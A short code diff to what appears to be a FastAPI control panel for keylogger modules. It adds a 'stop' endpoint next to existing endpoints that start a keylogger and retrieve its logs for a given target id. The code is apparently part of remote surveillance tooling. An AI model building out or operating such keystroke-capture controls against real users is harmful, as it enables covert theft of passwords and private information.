@@ -15,3 +15,7 @@ async def get_keylogger_logs(id: str = Query(None), keylogger_service: Keylogger
 @router.post("/api/modules/keylogger/start")
 async def start_keylogger(id: str = Query(None), keylogger_service: KeyloggerService = Depends(get_keylogger_service)):
     return await keylogger_service.start(id)
+
+@router.post("/api/modules/keylogger/stop")
+async def stop_keylogger(id: str = Query(None), keylogger_service: KeyloggerService = Depends(get_keylogger_service)):
+    return await keylogger_service.stop(id)
